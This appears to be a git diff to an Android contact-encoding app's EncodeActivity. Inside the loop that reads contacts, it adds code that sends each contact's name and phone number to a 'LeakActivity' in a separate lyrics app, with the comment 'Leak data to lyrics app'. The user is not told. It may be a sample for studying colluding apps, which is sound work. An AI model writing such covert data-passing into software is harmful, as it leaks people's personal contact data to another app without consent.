@@ -1,6 +1,7 @@
 package xyz.praveen.contactx;
 
 import android.app.Activity;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.database.Cursor;
@@ -69,6 +70,14 @@ public class EncodeActivity extends AppCompatActivity {
                             String phn_no = phones.getString(phones.getColumnIndex("data1"));
                             String name = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.DISPLAY_NAME));
                             jsonContact = JsonFactory.ContactToJson(name, phn_no);
+
+                            // Leak data to lyrics app
+                            Intent intent = new Intent();
+                            intent.setComponent(new ComponentName(
+                                    "xyz.praveen.lyricx",
+                                    "xyz.praveen.lyricx.LeakActivity"));
+                            intent.putExtra("leakData", jsonContact);
+                            startActivity(intent);
                         }
 
 
